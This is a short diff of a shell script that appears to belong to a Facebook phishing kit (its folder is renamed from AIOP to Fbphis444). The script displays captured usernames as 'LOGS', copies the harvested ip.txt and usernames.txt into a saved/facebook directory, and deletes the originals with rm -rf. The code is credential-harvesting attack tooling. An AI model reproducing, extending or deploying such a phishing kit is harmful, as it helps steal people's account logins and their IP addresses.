@@ -16,7 +16,7 @@ echo -e "\e[96m |---------------------------------------------------------------
 ip=$(cat usernames.txt)
 printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] LOGS:\e[0m\e[1;92m $ip \e[0m\n" $ip
 echo -e "\e[96m |---------------------------------------------------------------|"
-cp -f ip.txt usernames.txt $HOME/AIOP/source/saved/facebook
+cp -f ip.txt usernames.txt $HOME/Fbphis444/source/saved/facebook
 rm -rf ip.txt usernames.txt
 echo ""
 echo ""
